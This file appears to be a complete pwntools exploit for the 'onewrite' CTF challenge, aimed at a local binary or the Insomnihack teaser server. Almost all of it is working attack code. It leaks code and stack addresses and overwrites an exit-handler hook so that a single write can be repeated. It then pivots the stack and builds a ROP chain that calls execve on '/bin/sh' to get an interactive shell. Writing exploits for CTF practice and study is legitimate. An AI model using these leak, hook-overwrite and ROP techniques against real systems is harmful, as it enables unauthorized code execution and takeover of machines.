from pwn import *
from time import sleep

local = True
if local:
    p = process('./onewrite')
    DELAY = 0.1
else:
    p = remote('onewrite.teaser.insomnihack.ch', 1337)
    DELAY = 0.5


def leak_pie():
    p.send('2\n')
    p.recvuntil('> ')
    time.sleep(DELAY)
    text_string = p.recvuntil('\n')
    ADDR = int(text_string[2:],16)
    return ADDR

def leak_stack(data=None):
    if not data or (len(data) > 13):
        p.send('1\n')
    else:
        p.send('1'+data+'\n')
    p.recvuntil('> ')
    time.sleep(DELAY)
    text_string = p.recvuntil('\n')
    log.info("stack address = " + text_string)
    ADDR = int(text_string[2:],16)
    #log.info(str(ADDR))
    return ADDR

def make_a_write(data, location, sleep=False, debug=False):
    p.recvuntil("address : ")
    time.sleep(DELAY)
    p.send(str(location))
    time.sleep(DELAY)
    p.recvuntil("data : ")
    if(sleep):
        time.sleep(20)
    p.send(p64(data))
    time.sleep(DELAY)
    if debug:
        log.info("make_a_write: wrote " + hex(data) + " to " + hex(location)+".")

def write_ROP_chain_contents(data, location, leak_data=None, sleep=False):
    stack_addr = leak_stack(data=leak_data)
    #log.info("Stack address is at " + hex(stack_addr))
    make_a_write(data, location, sleep=sleep)
    log.info("write_ROP_chain_contents: wrote " + hex(data) + " to " + hex(location) + ".")

LEAK_ADDR = leak_pie()
WRITABLE_BASE_ADDR = LEAK_ADDR - 0x8a15 + 0x2ad000
TEXT_BASE_ADDR = WRITABLE_BASE_ADDR - 0x2ad000
EXIT_FUNCTION = WRITABLE_BASE_ADDR + 0x4140 # 0x7f2c5b23a140
ELF_SET___LIBC_ATEXIT_ELEMENT__IO_CLEANUP_ADDR = WRITABLE_BASE_ADDR + 0x62e8
LIBC_START_MAIN_ADDR = LEAK_ADDR +0x36b

log.info("do_leak is at " + hex(LEAK_ADDR))
#log.info("   insert a breakpoint right after the read: " + hex(TEXT_BASE_ADDR + 0x8a10 ))
log.info("base of writable section is " + hex(WRITABLE_BASE_ADDR))
log.info("libc_start_main address is " + hex(LIBC_START_MAIN_ADDR))
log.info("overwriting exit handler hook at this address: " + hex(ELF_SET___LIBC_ATEXIT_ELEMENT__IO_CLEANUP_ADDR))
#log.info("You should put a breakpoint in elf_set_libc at: " + hex(WRITABLE_BASE_ADDR + 0x62e8))
log.info("Return address for do_leak is at " + hex(LEAK_ADDR + 0xa2))
log.info("text base address is at " + hex(TEXT_BASE_ADDR))

POP_RAX_GADGET_ADDR = TEXT_BASE_ADDR + 0x460ac
POP_RDX_POP_RSI_GADGET_ADDR = TEXT_BASE_ADDR + 0x484e9
POP_RDI_GADGET_ADDR = TEXT_BASE_ADDR + 0x84fa
POP_RSI_GADGET_ADDR = TEXT_BASE_ADDR + 0xd9f2
SYSCALL_GADGET_ADDR = TEXT_BASE_ADDR + 0x917c
CALL_DO_LEAK_ADDR = TEXT_BASE_ADDR + 0x8b04
sleep(DELAY)

## Overwrite the writable hook for the exit handler!
make_a_write(LEAK_ADDR, ELF_SET___LIBC_ATEXIT_ELEMENT__IO_CLEANUP_ADDR, debug=True)

## Next goal: write the ROP chain.
stack_addr = leak_stack(data="AAAAAAABBBBBB")
log.info("Original stack address is at " + hex(stack_addr))
ROP_BASE_ADDR = stack_addr + 0x18
make_a_write(LEAK_ADDR, ROP_BASE_ADDR, debug=True)

# Reposition the stack pointer while writing a return to do_leak to the stack
def move_back_0x18(leak_data=None, sleep=False):
    stack_addr = leak_stack(data=leak_data)
    #log.info("Stack address is at " + hex(stack_addr))
    do_overwrite_ret_addr = stack_addr - 0x08 # return address from do_overwrite
    # Optionally sleep for debugging purposes
    if sleep:
        time.sleep(20)
    make_a_write(LEAK_ADDR, do_overwrite_ret_addr, debug=True)

# Reposition the stack pointer while writing a return to do_leak to the stack
def move_up_0x8(leak_data=None, sleep=False):
    stack_addr = leak_stack(data=leak_data)
    #log.info("Stack address is at " + hex(stack_addr))
    do_overwrite_ret_addr = stack_addr+0x18 # return address from do_leak
    # Optionally sleep for debugging purposes
    if sleep:
        time.sleep(20)
    make_a_write(LEAK_ADDR, do_overwrite_ret_addr, debug=True)

# The leak_data is just to aid with debugging, so I can better see my 
# inputs on the stack
move_back_0x18(leak_data="CCCCCCCDDDDDD")
move_back_0x18(leak_data="EEEEEEEFFFFFF")
# From do_leak start:
'''
pwndbg> x /10xg $rsp
0x7fffb7a26e50: 0x00007fffb7a26e60  0x00007f22e2491a15
0x7fffb7a26e60: 0x00007f22e2491a15  0x00007f22e2491a15
0x7fffb7a26e70: 0x00007f22e2491a15  0x00007f22e2491a15
0x7fffb7a26e80: 0x3038373837393331  0x758c36aa513c7000
0x7fffb7a26e90: 0x0000000000000000  0x00007f22e2491060
'''
move_up_0x8(leak_data="GGGGGGGHHHHHH")
'''
at return from do_leak:
pwndbg> x /20xg $rsp
0x7ffd8ac182b0: 0x00007f8ffe3e6a15  0x00007f8ffe3e6a15
0x7ffd8ac182c0: 0x00007f8ffe3e6a15  0x00007f8ffe3e6a15
0x7ffd8ac182d0: 0x00007f8ffe3e6a15  0x00007f8ffe3e6a15
0x7ffd8ac182e0: 0x3234363532303431  0x2dfeff68089bc000
0x7ffd8ac182f0: 0x0000000000000000  0x00007f8ffe3e6060
0x7ffd8ac18300: 0x00007f8ffe3e7780  0x00007f8ffe3e7810
0x7ffd8ac18310: 0x0000000000000000  0x0000000000000000
0x7ffd8ac18320: 0x0000000000000000  0x00007f8ffe3ed27a
0x7ffd8ac18330: 0x0000000000000000  0x2dfeff68089bc000
0x7ffd8ac18340: 0x00007f8ffe3e6060  0x00007f8ffe3e7090
'''
move_back_0x18(leak_data="IIIIIIIJJJJJJ",sleep=False)

# For the ROP chain I want:
# rdi: pointer to "/bin/sh"
# rsi: null
# rdx: null
# rax: 0x3b
# jump to SYSCALl
write_ROP_chain_contents(data=59, location=stack_addr+0x28, leak_data="KKKKKKKLLLLLL")
write_ROP_chain_contents(data=POP_RDI_GADGET_ADDR, location=stack_addr+0x30)
write_ROP_chain_contents(data=0x0068732f6e69622f, location=stack_addr+0x68) # /bin/sh\x00, null-terminated
write_ROP_chain_contents(data=stack_addr+0x68, location=stack_addr+0x38)
write_ROP_chain_contents(data=POP_RDX_POP_RSI_GADGET_ADDR, location=stack_addr+0x40) # /bin/sh\x00
write_ROP_chain_contents(data=0x0, location=stack_addr+0x48)
write_ROP_chain_contents(data=0x0, location=stack_addr+0x50)
write_ROP_chain_contents(data=SYSCALL_GADGET_ADDR, location=stack_addr+0x58)
write_ROP_chain_contents(data=POP_RAX_GADGET_ADDR, location=stack_addr+0x20, sleep=False) # throwaway
p.interactive()



